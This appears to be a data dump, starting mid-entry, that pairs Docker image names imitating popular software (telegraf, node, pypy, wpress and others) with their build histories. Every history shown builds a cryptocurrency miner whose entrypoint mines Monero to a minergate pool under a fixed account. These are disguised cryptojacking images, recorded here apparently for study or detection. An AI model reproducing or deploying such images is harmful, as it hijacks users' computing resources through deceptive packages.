"";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
inm50mbml/rbase; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
nodezipiaverdovcom/storm; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
rhprlaohocom/telegraf; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
sfprtoonml/netsca; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
sizacoreclipcom/zook; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
wpiwmailfscom/unifi; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
xsqsisdaqcom/node; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
yuyecetotinozaorg/wpress; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:6086fe1466d461e3d763ca57e1e45bd5c35d1a87a8b1a7ca6b9085c795c13dd6 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
xrprmorriesworldml/unison; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
sizohicolakekitacom/pypy; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
sanajvipepecom/wpress; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
uqprdrivetagdevcom/bleemeo; b'ADD file:d14b493577228a498919faab376609c73048c0220b06d2989ecaaf1bdc17cf6c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update -qq &&             apt-get install -qqy libcurl4-openssl-dev libncurses5-dev pkg-config automake make yasm git\nRUN git clone https://github.com/OhGodAPet/cpuminer-multi\nRUN cd cpuminer-multi &&             ./autogen.sh &&             CFLAGS="-march=native" ./configure &&             make\nWORKDIR /cpuminer-multi\nADD file:afde9ecdee7c30424c34429495943506ea91afa626d8572e82d486ecf84310b2 /bin/minerd\nRUN chmod 755 /bin/minerd\nENTRYPOINT ["/bin/minerd -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u trudly@outlook.com -p x -t 1"]'
